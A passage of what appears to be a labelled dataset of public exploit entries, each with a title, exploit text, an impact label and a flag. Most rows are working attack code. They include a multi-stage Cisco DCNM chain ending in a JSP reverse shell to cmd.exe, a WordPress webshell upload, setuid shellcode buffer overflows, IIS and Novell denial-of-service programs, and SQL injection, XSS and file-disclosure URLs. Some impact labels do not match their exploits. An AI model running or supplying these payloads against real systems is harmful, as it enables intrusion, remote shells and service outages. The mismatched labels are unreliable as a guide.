""C:/Program Files/Cisco Systems/dcm/fm/reports/1337/"",       };       for (String s:files){ File f = new File(s); f.delete(); }       File f = new File(application.getRealPath(""/"" + this.getClass().getSimpleName().replaceFirst(""_"",""."")));       f.delete();       class StreamConnector extends Thread       {         InputStream we;         OutputStream uo;          StreamConnector( InputStream we, OutputStream uo )         {           this.we = we;           this.uo = uo;         }          public void run()         {           BufferedReader dy  = null;           BufferedWriter zvi = null;           try           {             dy  = new BufferedReader( new InputStreamReader( this.we ) );             zvi = new BufferedWriter( new OutputStreamWriter( this.uo ) );             char buffer[] = new char[8192];             int length;             while( ( length = dy.read( buffer, 0, buffer.length ) ) > 0 )             {               zvi.write( buffer, 0, length );               zvi.flush();             }           } catch( Exception e ){}           try           {             if( dy != null )               dy.close();             if( zvi != null )               zvi.close();           } catch( Exception e ){}         }       }        try       {         String ShellPath;         ShellPath = new String(""cmd.exe"");         Socket socket = new Socket( ""%s"", %s);         Process process = Runtime.getRuntime().exec( ShellPath );         ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();         ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();       } catch( Exception e ) {}     %%>     """""" % (cbh, cbp)     return jsp  def get_session(target, user, password):     """""" we have bypassed auth at this point and created an admin """"""     d = {         ""j_username"" : user,         ""j_password"" : password     }     uri = ""https://%s/j_spring_security_check"" % target     r = requests.post(uri, data=d, verify=False, allow_redirects=False)     if ""Set-Cookie"" in r.headers:         match = re.search(r""JSESSIONID=(.{56}).*resttoken=(\d{1,4}:.{44});"", r.headers[""Set-Cookie""])         if match:             sessionid = match.group(1)             resttoken = match.group(2)             return { ""JSESSIONID"" : sessionid, ""resttoken"": resttoken}     return False  def craft_soap_header():     soap_header  = '\t<SOAP-ENV:Header xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"">'     soap_header += '<m:ssoToken xmlns:m=""http://ep.jaxws.dcbu.cisco.com/"">%s</m:ssoToken>' % gen_ssotoken()     soap_header += '\t</SOAP-ENV:Header>'     return soap_header  def we_can_trigger_folder_path_creation(target):     """""" craft the path location and db entry for the traversal """"""     soap_body  = '<soapenv:Envelope xmlns:soapenv=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:ep=""http://ep.san.jaxws.dcbu.cisco.com/"">'     soap_body += craft_soap_header()     soap_body += '\t<soapenv:Body>'     soap_body += '\t\t<ep:saveReportTemplate>'     soap_body += '\t\t\t<reportTemplateName>si</reportTemplateName>'     soap_body += '\t\t\t<userName>1337</userName>'     soap_body += '\t\t\t<updatedAttrs></updatedAttrs>'     soap_body += '\t\t\t<pmInterval>1337</pmInterval>'     soap_body += '\t\t</ep:saveReportTemplate>'     soap_body += '\t</soapenv:Body>'     soap_body += '</soapenv:Envelope>'     uri = ""https://%s/ReportWSService/ReportWS"" % target     r = requests.post(uri, data=soap_body, verify=False)     if r.status_code == 200:         return True     return False  def we_can_trigger_second_order_write(target, shellpath):     """""" trigger the traversal """"""     soap_body  = '<soapenv:Envelope xmlns:soapenv=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:ep=""http://ep.san.jaxws.dcbu.cisco.com/"">'     soap_body += craft_soap_header()     soap_body += '\t<soapenv:Body>'     soap_body += '\t\t<ep:openReportTemplate>'     soap_body += '\t\t\t<reportTemplateName>%s</reportTemplateName>' % shellpath     soap_body += '\t\t\t<userName>1337</userName>'     soap_body += '\t\t</ep:openReportTemplate>'     soap_body += '\t</soapenv:Body>'     soap_body += '</soapenv:Envelope>'     uri = ""https://%s/ReportWSService/ReportWS"" % target     r = requests.post(uri, data=soap_body, verify=False)     if r.status_code == 200:         return True     return False  def gen_ssotoken():     """""" auth bypass """"""     timestamp = 9999999999999  # we live forever     username = ""hax""           # doesnt even need to exist!     sessionid = 1337           # doesnt even need to exist!     d = ""%s%d%dPOsVwv6VBInSOtYQd9r2pFRsSe1cEeVFQuTvDfN7nJ55Qw8fMm5ZGvjmIr87GEF"" % (username, sessionid, timestamp)     return ""%d.%d.%s.%s"" % (sessionid, timestamp, base64.b64encode(md5.new(d).digest()), username)  def we_can_trigger_sql_injection(target, sql):     """""" stacked sqli primitive """"""     sqli = "";%s--"" % sql     soap_body  = '<soapenv:Envelope xmlns:soapenv=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:ep=""http://ep.san.jaxws.dcbu.cisco.com/"">'     soap_body += craft_soap_header()     soap_body += '\t<soapenv:Body>'     soap_body += '\t\t<ep:getVmHostData>'     soap_body += '\t\t\t<arg0>'     soap_body += '\t\t\t\t<sortField>vcluster</sortField>'     soap_body += '\t\t\t\t<sortType>%s</sortType>' % sqli     soap_body += '\t\t\t</arg0>'     soap_body += '\t\t\t<arg1></arg1>'     soap_body += '\t\t\t<arg2></arg2>'     soap_body += '\t\t\t<arg3>false</arg3>'     soap_body += '\t\t</ep:getVmHostData>'     soap_body += '\t</soapenv:Body>'     soap_body += '</soapenv:Envelope>'     uri = ""https://%s/DbInventoryWSService/DbInventoryWS"" % target     r = requests.post(uri, data=soap_body, verify=False)     if r.status_code == 200:         return True     return False  def we_can_leak_vfs(target):     """""" we use a information disclosure for the vfs path """"""     global vfs     uri = 'https://%s/serverinfo/HtmlAdaptor?action=displayServerInfos' % target     c = requests.auth.HTTPBasicAuth('admin', 'nbv_12345')     r = requests.get(uri, verify=False, auth=c)     match = re.search(r""temp\\(.{21}content-.{15,16})"", r.text)     if match:         vfs = str(match.group(1).replace(""\\"",""/""))         return True     return False  def handler(lp):     """""" this is the client handler, to catch the connectback """"""     print ""(+) starting handler on port %d"" % lp     t = telnetlib.Telnet()     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     s.bind((""0.0.0.0"", lp))     s.listen(1)     conn, addr = s.accept()     print  ""(+) connection from %s"" % addr[0]     t.sock = conn     print ""(+) pop thy shell!""     t.interact()  def exec_code(t, usr, pwd, cbp):     """""" this function threads the client handler and sends off the attacking payload """"""     handlerthr = Thread(target=handler, args=(int(cbp),))     handlerthr.start()     r = requests.get(""https://%s/si.jsp"" % t, cookies=get_session(t, usr, pwd), verify=False)  def we_can_add_user(target, usr, pwd):     """""" add a user so that we can reach our backdoor! """"""     soap_body  = '<soapenv:Envelope xmlns:soapenv=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:ep=""http://ep.san.jaxws.dcbu.cisco.com/"">'     soap_body += craft_soap_header()     soap_body += '\t<soapenv:Body>'     soap_body += '\t\t<ep:addUser>'     soap_body += '\t\t\t<userName>%s</userName>' % usr     soap_body += '\t\t\t<password>%s</password>' % pwd     soap_body += '\t\t\t<roleName>global-admin</roleName>'     soap_body += '\t\t\t<enablePwdExpiration>false</enablePwdExpiration>'     soap_body += '\t\t</ep:addUser>'     soap_body += '\t</soapenv:Body>'     soap_body += '</soapenv:Envelope>'     uri = ""https://%s/DbAdminWSService/DbAdminWS"" % target     r = requests.post(uri, data=soap_body, verify=False)     tree = ElementTree.fromstring(r.content)     for elem in tree.iter():         if elem.tag == ""resultMessage"":             res = elem.text     if res == ""Success"":         return True     elif res == ""User already exists."":         return True     return False  def main():      usr = ""hacker""     pwd = ""Hacked123""      if len(sys.argv) != 3:         print ""(+) usage: %s <target> <connectback>"" % sys.argv[0]         print ""(+) eg: %s 192.168.100.122 192.168.100.59:1337"" % sys.argv[0]         sys.exit(1)      t = sys.argv[1]     c = sys.argv[2]      cbh = c.split("":"")[0]     cbp = c.split("":"")[1]     sc = _get_jsp(cbh, cbp).encode(""hex"")      # stage 1 - add a user     if we_can_add_user(t, usr, pwd):         print ""(+) created the account %s:%s"" % (usr, pwd)          # stage 2 - trigger folder creation and db entry         if we_can_trigger_folder_path_creation(t):             print ""(+) created the 1337/custom path!""              # stage 3 - leak the vfs path (not really required I suppose)             if we_can_leak_vfs(t):                 print ""(+) leaked vfs! %s"" % vfs                  # stage 4 - trigger the sql injection to update our template entry                 sp = ""../../../../wildfly-10.1.0.Final/standalone/tmp/vfs/temp/%s/si.jsp"" % vfs                 sql = ""update xmldocs set document_name='%s',content=decode('%s','hex') where user_name='1337';"" % (sp, sc)                 if we_can_trigger_sql_injection(t, sql):                     print ""(+) SQL Injection working!""                      # stage 5 - trigger the shell write                     if we_can_trigger_second_order_write(t, sp):                         print ""(+) wrote the si.jsp shell!""                          # stage 6 - cleanup                         sql = ""delete from xmldocs where user_name='1337';""                         if we_can_trigger_sql_injection(t, sql):                             print ""(+) cleaned up the database!""                          # stage 7 - go get some rce                         exec_code(t, usr, pwd, cbp)  if __name__ == ""__main__"":     main()",Code Execution,1
36478,"WordPress Plugin InBoundio Marketing 1.0 - Arbitrary File Upload <?php ########################################### #-----------------------------------------# #[ 0-DAY Aint DIE | No Priv8 | KedAns-Dz ]# #-----------------------------------------# #     *----------------------------*      # #  K  |....##...##..####...####....|  .   # #  h  |....#...#........#..#...#...|  A   # #  a  |....#..#.........#..#....#..|  N   # #  l  |....###........##...#.....#.|  S   # #  E  |....#.#..........#..#....#..|  e   # #  D  |....#..#.........#..#...#...|  u   # #  .  |....##..##...####...####....|  r   # #     *----------------------------*      # #-----------------------------------------# #[ Copyright (c) 2015 | Dz Offenders Cr3w]# #-----------------------------------------# ########################################### # >>    D_x . Made In Algeria . x_Z    << # ########################################### # # [>] Title : WordPress plugin (InBoundio Marketing) Shell Upload Vulnerability # # [>] Author : KedAns-Dz # [+] E-mail : ked-h (@hotmail.com) # [+] FaCeb0ok : fb.me/K3d.Dz # [+] TwiTter : @kedans # # [#] Platform : PHP / WebApp # [+] Cat/Tag : File Upload / Code Exec # # [<] <3 <3 Greetings t0 Palestine <3 <3 # [!] Vendor : http://www.inboundio.com # ########################################### # # [!] Description : # # Wordpress plugin InBoundio Marketing v1.0 is suffer from File/Shell Upload Vulnerability # remote attacker can upload file/shell/backdoor and exec commands. # #### # Lines (6... to 20) : csv_uploader.php #### # # ExpLO!T :  # -------  $postData = array(); $postData[ 'file' ] = ""@k3dz.php""; #Shell_2_Exec ;)  $dz = curl_init(); curl_setopt($dz, CURLOPT_URL, ""http://[Target]/wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php""); curl_setopt($dz, CURLOPT_USERAGENT, ""Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)""); curl_setopt($dz, CURLOPT_POST, 1); curl_setopt($dz, CURLOPT_POSTFIELDS, $postData ); curl_setopt($dz, CURLOPT_TIMEOUT, 0); $buf = curl_exec ($dz); curl_close($dz); unset($dz); echo $buf;  /* [!] creat your shell file =>  _ k3dz.php :   <?php system($_GET['dz']); ?>   [>] Post the exploit  [+] Find you'r backdoor : ../inboundio-marketing/admin/partials/uploaded_csv/k3dz.php?dz=[ CMD ] [+] Or upload what you whant ^_^ ...  */  #### #  <! THE END ^_* ! , Good Luck all <3 | 0-DAY Aint DIE ^_^ !> #  Hassi Messaoud (30500) , 1850 city/hood si' elHaouass .<3 #--------------------------------------------------------------- # Greetings to my Homies : Meztol-Dz , Caddy-Dz , Kalashinkov3 ,  # Chevr0sky , Mennouchi.Islem , KinG Of PiraTeS , TrOoN , T0xic, # & Jago-dz , Over-X , Kha&miX , Ev!LsCr!pT_Dz , Barbaros-DZ , & # & KnocKout , Angel Injection , The Black Divels , kaMtiEz  , & # & Evil-Dz , Elite_Trojan , MalikPc , Marvel-Dz , Shinobi-Dz, & # & Keystr0ke , JF , r0073r , CroSs , Inj3ct0r/Milw0rm 1337day &  # PacketStormSecurity * Metasploit * OWASP * OSVDB * CVE Mitre ; ####  # REF : http://k3dsec.blogspot.com/2015/03/wordpress-plugin-inboundio-marketing.html  ?>",upload fileshellbackdoor and exec commands,1
28949,"bitweaver 1.x - '/newsletters/edition.php?tk' SQL Injection source: https://www.securityfocus.com/bid/20988/info  Bitweaver is prone to multiple input-validation vulnerabilities because the application fails to sufficiently sanitize user-supplied input. These issues include multiple HTML-injection issues and multiple SQL-injection issues.   A successful exploit of these vulnerabilities could allow an attacker to compromise the application, access or modify data, steal cookie-based authentication credentials, or even exploit vulnerabilities in the underlying database implementation. Other attacks are also possible.  Bitweaver 1.3.1 and prior versions are vulnerable to these issues.  http://www.example.com/newsletters/edition.php?tk=[SQL]&find=1&search=suchen","compromise the application, access or modify data, steal cookie-based authentication credentials, or even exploit vulnerabilities in the underlying database implementation",1
36007,"AzeoTech DaqFactory - Denial of Service source: https://www.securityfocus.com/bid/48955/info  AzeoTech DAQFactory is prone to a denial-of-service vulnerability.  Attackers can exploit this issue to cause the application to crash, denying service to legitimate users.  Versions prior to DAQFactory 5.85 are vulnerable.    The following exploit requests are available:  preamble: ""\x01\x00\x09\x00CPassword\x00""  reboot: ""\x01\x00\x0f\x00CCommandGeneric\x01\x00\x00\x00\x04\x00\x00\x00""  shutdown: ""\x01\x00\x0f\x00CCommandGeneric\x01\x00\x00\x00\x06\x00\x00\x00""",denial-of-service,1
4278,"Pixlie 1.7 - 'pixlie.php?root' Remote File Disclosure Pixlie 1.7 Remote File Disclosure Vulnerability -----------------------------------------------------------------------  Script : Pixlie 1.7  Version : 1.7  Site : http://www.pixlie.de/download.php  Founder : Rizgar  Contact : rizgar@linuxmail.org and irc.gigachat.net #kurdhack  Thanks : Kurdish Hackers Clan(Anti Fashist Group :P), PH(HERO) , ColdHackers(nice boys)  d0rk : ""Pixlie - die kostenlose Bildergalerie""  -----------------------------------------------------------------------  look at pixlie.php   //$root = ""/home/www/IhrBenutzer/html"";    PoC :  http://www.example.com/pixlie.php?root=../../../../../etc/passwd%00  # milw0rm.com [2007-08-10]",code execution,1
22670,"Microsoft IIS 5.0 - WebDAV PROPFIND / SEARCH Method Denial of Service /* source: https://www.securityfocus.com/bid/7735/info  Microsoft Internet Information Services has been reported vulnerable to a denial of service.  When WebDAV receives excessively long requests to the 'PROPFIND' or 'SEARCH' variables, the IIS service will fail. All current web, FTP, and email sessions will be terminated.  IIS will automatically restart and normal service will resume.  ** It has been reported that if a WebDAV request with a certain number of bytes is received, the Inetinfo service will remain alive but cease serving requests. This will cause the IIS server to stop serving requests until the service is manually restarted. */  /* IIS eXploit. by velan. Greetz to: Shashank Pandey a.k.a +(Neo1)+ Bid:  7735 */  #define ERROR -1 #define OK 1  #ifdef HAVE_CONFIG_H #include <config.h> #endif  #include <stdio.h> #include <stdlib.h> #include <sys/socket.h> #include <sys/types.h> #include <netinet/in.h> #include <arpa/inet.h> #include <string.h>  int check_for_iis(); void screw_iis(); void usage();  char IP[15];  int main(int argc, char *argv[]) { /*  cout << ""Hello, World!"" << endl;  */     if(argc !=2)    {       usage();  exit(0);    }     printf(""IIS eXploit. by velan. Greetz to: Shashank Pandey a.k.a +(Neo1)+\n"");     strcpy(IP, argv[1]);     if(check_for_iis() != OK)    {       printf(""Sorry, BAD LUCK! \n"");    exit(0);    }     screw_iis();    return EXIT_SUCCESS; }  int check_for_iis() {   int sck, flag = 1;   struct sockaddr_in sin;   char req[50];    sck = socket(AF_INET, SOCK_STREAM, 0);   if(sck == ERROR)   {     perror(""Socket error "");      exit(0);   }    sin.sin_port = htons(80);   sin.sin_family = AF_INET;   sin.sin_addr.s_addr = inet_addr(IP);    if ((connect(sck, (struct sockaddr *) &sin, sizeof(sin))) == -1)   {     perror(""Connect Error "");     exit(0);   }    strcpy(req, ""GET / HTTP/1.0\r\n\n"");   send(sck, req, sizeof(req), 0);   recv(sck, req, sizeof(req), 0);    if (strstr(req,""IIS"") == NULL)   {     printf("" Not an IIS server! \n"");     flag = 0;   }    sprintf(req,""SEARCH / HTTP/1.0\r\n\n"",40);   send(sck, req, sizeof(req), 0);   recv(sck, req, sizeof(req), 0);    if (strstr(req,""HTTP/1.1 411 Length Required"") == NULL)   {     printf(""METHOD SEARCH NOT ALLOWED. \n"");     flag = 0;   }    return(flag); }    void screw_iis() {   int sck, flag = 1;   struct sockaddr_in sin;   char junk[100];   char buffer[65535] ="""";   char request[80000];   char content[] =            ""<?xml version=\""1.0\""?>\r\n""            ""<g:searchrequest xmlns:g=\""DAV:\"">\r\n""            ""<g:sql>\r\n""            ""Select \""DAV:displayname\"" from scope()\r\n""            ""</g:sql>\r\n""            ""</g:searchrequest>\r\n"";     sck = socket(AF_INET, SOCK_STREAM, 0);   if(sck == ERROR)   {     perror(""Socket error "");      exit(0);   }    sin.sin_port = htons(80);   sin.sin_family = AF_INET;   sin.sin_addr.s_addr = inet_addr(IP);    if ((connect(sck, (struct sockaddr *) &sin, sizeof(sin))) == -1)   {     perror(""Connect Error "");     exit(0);   }    buffer[sizeof(buffer)]=0x00;    memset(buffer,'S',sizeof(buffer));   memset(request,0,sizeof(request));   memset(junk,0,sizeof(junk));    sprintf(request,""SEARCH /%s HTTP/1.1\r\nHost: %s\r\nContent-type: text/xml\r\nCon tent-Length: "",buffer,IP);   sprintf(request,""%s%d\r\n\r\n"",request,strlen(content));    printf(""\r\nScrewing the server... \n"");    send(sck,request,strlen(request),0);    send(sck,content,strlen(content),0);    recv(sck,junk,sizeof(junk),0);    if(junk[0]==0x00)   {      printf(""Server is Screwed! \r\n"");   }   else   {       printf(""BAD LUCK. Patched.\n"");   } }    void usage() {   printf(""IIS eXploit. by velan. Greetz to: Shashank Pandey a.k.a +(Neo1)+\n"");   printf(""Usage\r\n"");   printf(""Screw_IIS <victim IP>\n""); }",denial of service,1
45784,"Voovi Social Networking Script 1.0 - 'user' SQL Injection  Exploit Title: Voovi Social Networking Script 1.0 - 'user' SQL Injection # Dork: N/A # Date: 2018-11-04 # Exploit Author: Ihsan Sencan # Vendor Homepage: http://www.adminspoint.com/voovi/index.php # Software Link: https://netix.dl.sourceforge.net/project/voovi/voovi%20a%20social%20networking%20script.zip # Version: 1.0 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: N/A  # POC:  # 1) # http://localhost/[PATH]/? #  POST /[PATH]/? HTTP/1.1 Host: TARGET User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 165 user=1' UNION SELECT NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL-- -&password=&action=login&submit= HTTP/1.1 200 OK Date: Sun, 04 Nov 2018 14:22:41 GMT Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30 X-Powered-By: PHP/5.6.30 Set-Cookie: PHPSESSID=v8nhfofpnrt6a4clfqbrp7aa00; path=/ Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Content-Length: 5987 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html; charset=UTF-8",information disclosure,1
20450,"Trlinux Postaci Webmail 1.1.3 - Password Disclosure source: https://www.securityfocus.com/bid/2029/info  Postaci Webmail is a database-driven web e-mail system. PostACI contains a vulnerability in its default configuration that may allow a remote attacker to gain access to the underlying database.  Webmail stores database username and password information in a file called global.inc. This file is world-readable and stored in a directory accessible by a web browser over the internet. As a result, an attacker can retrieve the global.inc file with a web browser on a typical system (default configuration). Once obtained, the attacker may be able to access the systems database.  Successful exploitation will lead to the attacker gaining unauthorized access to the database.  Depending on the database and system type, this may lead to a compromise of interactive access on the host running Webmail and the database.   http://target/includes/global.inc",gain access to the underlying database,1
37522,WordPress Plugin chenpress - Arbitrary File Upload source: https://www.securityfocus.com/bid/54635/info  The chenpress plugin for WordPress is prone to a vulnerability that lets attackers upload arbitrary files. The issue occurs because the application fails to adequately sanitize user-supplied input.  An attacker can exploit this vulnerability to upload arbitrary code and run it in the context of the web server process. This may facilitate unauthorized access or privilege escalation; other attacks are also possible.   http://www.example.com/wp-content/plugins/chenpress/FCKeditor/editor/filemanager/browser/mcpuk/browser.html,upload arbitrary files,1
29800,"Microsoft Internet Explorer 7 - HTML Denial of Service source: https://www.securityfocus.com/bid/23178/info  Microsoft Internet Explorer is prone to a denial-of-service vulnerability because the application fails to handle exceptional conditions.  This issue is triggered when an attacker entices a victim user to visit a malicious website.  Remote attackers may exploit this issue to crash Internet Explorer, effectively denying service to legitimate users.  This issue affects Internet Explorer version 7.   # usr/bin/python  print ""-------------------------------------------------------------------------"" print "" Internet Explorer 7.0.5730.11 Denial of Service"" print "" author: shinnai"" print "" mail: shinnai[at]autistici[dot]org"" print "" site: http://shinnai.altervista.org\n"" print "" For convenience I post up a script in python that create a .html file"" print "" You can open it locally, upload and browse it or directely browse here:\n"" print "" http://www.shinnai.altervista.org/ie_dos.html\n"" print "" About 60 seconds and IE7 stops to answer :)"" print ""-------------------------------------------------------------------------""  tagHtml = ""<html>"" tagHtmlC = ""</html>"" tagHead = ""<head>"" tagHeadC = ""</head>"" tagTitle = ""<title>"" tagTitleC = ""</title>""  buff= ""\x90"" * 80000  boom = tagHtml + buff  + tagHead + buff + tagTitle + buff + tagTitleC + tagHeadC + tagHtmlC  try:    fileOut = open('ie_dos.html','w')    fileOut.write(boom)    fileOut.close()    print ""\nFILE CREATED!\n'NJOY IT...\n"" except:    print ""\nUNABLE TO CREATE FILE!\n""",denial-of-service,1
22923,"Tolis Group BRU 17.0 - Local Privilege Escalation (1) // source: https://www.securityfocus.com/bid/8215/info  It has been reported that BRU may not properly parse commandline arguments, potentially leading to at least two vectors of exploitation. It may be possible for local attackers to conduct format string-based attacks as well as buffer overflow-based attacks.  It should be noted that although BRU does not ship with the suid bit set by default, documentation within the software may instruct users to enable it.  /** EST BRU(TM) Backup and Restore Utility Local Root Exploit  **  ** By: Dvdman@l33tsecurity.com  **  ** Simple Stack overflow Wont say any more :P  **  ** Linux & FreeBsd Targets  **  ** Greetz: sam,flatline,v0id,#!l33tsecurity@efnet,KF,b0iler,schlumpf,kokanin,DSR  **  ** Public Release  ** L33tsecurity 2003; irc.secsup.org #l33tsecurity  **/  #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #include <sys/errno.h>  #define FUN ""./bru""  char shellcode[] =     ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""     ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""     ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""     ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""     ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""     ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""     ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""     ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""      /* SETUID(0) SHELLCODE LINUX */     ""\xfc\xfc\xfc\xfc\xfc\xfc\xfc\xfc\xfc\xfc\xfc\xfc""     ""\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f""     ""\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d""     ""\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"";  unsigned long sp(void) {            __asm__(""movl %esp,%eax""); }  int main(int argc, char **argv) {      char buffer[9000];     int x,target;       char    *env[2];     char    *args[24];      unsigned long ret = 0xbffffffa - strlen(shellcode) - strlen(FUN);       int *ptr = (int *)(buffer);     if (argc != 2) {        usage();        exit(0);        }              target = atoi(argv[1]);     if (target == 0) {     for (x=0; x<9000 ; x+=4)       *ptr++ = (ret + 1);    }     if (target == 1) {      for (x=0; x<3500 ; x+=4)           *ptr++ = 0xbfbffe48;    }          /* put in env */       env[0] = shellcode;          env[1] = NULL;       args[0] = FUN;     args[1] = buffer;     args[2] = NULL;       execve (args[0], args, env);     perror (""execve"");         }          int usage() { printf(""EST BRU(TM)local root exploit\n""); printf(""By: Dvdman@l33tsecurity.com\n""); printf(""Usage: ./ex_bru target\n""); printf(""TARGET LIST:\n""); printf(""0. LINUX\n1. FREEBSD\n""); return 0; }",at least two vectors of exploitation,0
30654,ActiveKB NX 2.6 - 'index.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/26027/info  ActiveKB NX is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal potentially sensitive information and launch other attacks.  This issue affects ActiveKB NX 2.6; other versions may also be vulnerable.   http://www.example.com/ActiveKB/page?=XSS,execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site,1
23917,"Panda ActiveScan 5.0 - 'ascontrol.dll' Remote Heap Overflow source: https://www.securityfocus.com/bid/10065/info  It has been reported that Panda ActiveScan may be prone to a remote heap overflow vulnerability that may allow an attacker to cause a denial of service condition in Internet Explorer or leverage the issue to execute arbitrary code.  The issue is reported to exist in the 'ascontrol.dll' file, specifically the 'Internacional' property of the 'ReportHebrew' object is identified as vulnerable.  Panda ActiveScan 5.0 has been reported to be prone to this issue.   <script language=vbscript> dim mymy Set mymy = CreateObject(""ASControl.ReportHebrew.1"" )  a=""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" mymy.Internacional a </script>",cause a denial of service condition in Internet Explorer or leverage the issue to execute arbitrary code,1
33581,Hybserv2 - ':help' Denial of Service source: https://www.securityfocus.com/bid/38006/info  Hybserv2 is prone to a denial-of-service vulnerability.  Attackers can exploit this issue to deny service to legitimate users.  Hybserv2 1.9.4 is vulnerable; other versions may also be affected.   The following example command is available:  PRIVMSG memoserv :help \t,denial-of-service,1
5344,"Novel eDirectory HTTP - Denial of Service #!/usr/bin/python # Novel eDirectory HTTP DOS # Discovered and coded by Mati Aharoni # muts..at..offensive-security.com # http://www.offensive-security.com/0day/novel-edir.py.txt  import socket import os import sys from time import sleep  biff=""<""*2048 print ""[*] Payload sent ""+ str(len(buff)) expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM ) expl.connect ( ( sys.argv[1], 8028 ) ) expl.send ( 'HEAD '+biff+' HTTP/1.1\r\nHost: 192.168.1.10:20\r\nUser-Agent: Mozilla/4.0 (Linux 2.6.21.5) Java/1.5.0_02\r\n\r\n') data=expl.recv(1024) print data expl.close()  # milw0rm.com [2008-04-02]",denial of service,1
1402,"SCO OpenServer 5.0.7 - 'termsh' Local Privilege Escalation /* SCO Openserver 5.0.7 termsh exploit  * ===================================  * 'termsh' is a program to view or modify an existing terminal entry on  * SCO Openserver. A stack based overflow exists in the handling of command  * line arguements, namely the [-o oadir] arguement. It is installed setgid  * auth in a default SCO Openserver 5.0.7 install. An attacker may use this  * flaw to gain write access to /etc/passwd or /etc/shadow  allowing for  * local root compromise.  *  * Example use.  * $ id  * uid=200(user) gid=50(group) groups=50(group)  * $ uname -a  * SCO_SV scosysv 3.2 5.0.7 i386  * $ gcc prdelka-vs-SCO-termshx.c -o prdelka-vs-SCO-termshx  * $ ./prdelka-vs-SCO-termshx /opt/K/SCO/Unix/5.0.7Hw/usr/lib/sysadm/termsh  * [ SCO Openserver 5.0.7 termsh local privilege escalation exploit  * $ id  * uid=200(user) gid=50(group) egid=21(auth) groups=50(group)  *  * - prdelka  */ #include <stdio.h> #include <stdlib.h>  char shellcode[]=""\x90\x90\x90\x90\x90\x90\x90\x90""                  ""\x68\xff\xf8\xff\x3c\x6a\x65\x89""                  ""\xe6\xf7\x56\x04\xf6\x16\x31\xc0""                  ""\x50\x68""""/ksh""""\x68""""/bin""""\x89""                  ""\xe3\x50\x50\x53\xb0\x3b\xff\xd6"";  int main(int argc,char* argv[]) {         char* buffer;         char* arg = ""-o"";         char *env[] = {""HISTORY=/dev/null"",NULL};         long eip,ptr;         int i;         printf(""[ SCO Openserver 5.0.7 termsh local privilege escalation exploit\n"");         if(argc < 2)         {                 printf(""[ Error  : [path]\n[ Example: %s /opt/K/SCO/Unix/5.0.7Hw/usr/lib/sysadm/termsh\n"",argv[0]);                 exit(0);         }         eip = 0xa2080853;         buffer = malloc(7449 + strlen(shellcode));         memset(buffer,'\x00',7449 + strlen(shellcode));         ptr = (long)buffer + strlen(shellcode);         strncpy(buffer,shellcode,strlen(shellcode));         for(i = 1;i <= 1862;i++)         {                 memcpy((char*)ptr,(char*)&eip,4);                 ptr = ptr + 4;         }         execle(argv[1],argv[1],arg,buffer,NULL,env);         exit(0); }  // milw0rm.com [2006-01-03]",denial of service,1
29177,MMGallery 1.55 - 'Thumbs.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/21281/info  The mmgallery script is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.   An attacker may leverage this issue to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  Version 1.55 is vulnerable to this issue; other versions may also be affected.  http://www.example.com/thumbs.php?page='>,have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site,1
